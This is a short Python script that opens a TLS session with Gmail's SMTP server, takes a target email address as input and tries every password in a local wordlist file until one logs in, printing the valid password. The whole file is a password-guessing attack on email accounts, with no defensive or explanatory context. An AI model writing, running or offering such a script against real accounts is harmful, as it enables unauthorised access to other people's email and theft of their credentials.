import smtplib
smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()
print('----')
email = input('Email: ')
dic = open('./diccionario.txt', 'r')
for pwd in dic:
    try: 
        smtpserver.login(email, pwd)
        print('Password valid: %s' %pwd)
        break;
    except smtplib.SMTPAuthenticationError:
        print('Error in password: %s' %pwd)

